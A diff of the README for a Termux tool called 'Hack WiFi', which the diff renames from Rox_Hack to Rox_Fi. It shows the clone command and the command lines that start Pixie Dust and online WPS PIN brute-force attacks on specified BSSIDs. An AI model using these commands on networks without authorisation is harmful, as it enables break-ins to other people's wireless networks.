@@ -1,4 +1,4 @@
-## Rox_Hack
+## Rox_Fi
 
 ### Hack WIfi Using Termux! (Requires Root)
 
@@ -18,13 +18,13 @@ $ git clone https://github.com/piomrox/Rox
 
 $ cd Rox
 
-$ chmod +x roxhack.py
+$ chmod +x roxfi.py
 
-$ sudo python roxhack.py --help
+$ sudo python roxfi.py --help
 
 ```
 
-#### Example : `sudo python roxhack.py -i wlan0 -K`
+#### Example : `sudo python roxfi.py -i wlan0 -K`
 
 #### Note: 
 
@@ -32,15 +32,15 @@ $ sudo python roxhack.py --help
 
 - Show avaliable networks and start Pixie Dust attack on a specified network.
 
-- `sudo python roxhack.py -i wlan0 -K`
+- `sudo python roxfi.py -i wlan0 -K`
 
 - - Start Pixie Dust attack on a specified BSSID:
 
-`sudo python roxhack.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
+`sudo python roxfi.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
 
 - Launch online WPS bruteforce with the specified first half of the PIN:
 
-- `sudo python roxhack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
+- `sudo python roxfi.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
 
 ### Troubleshooting
 
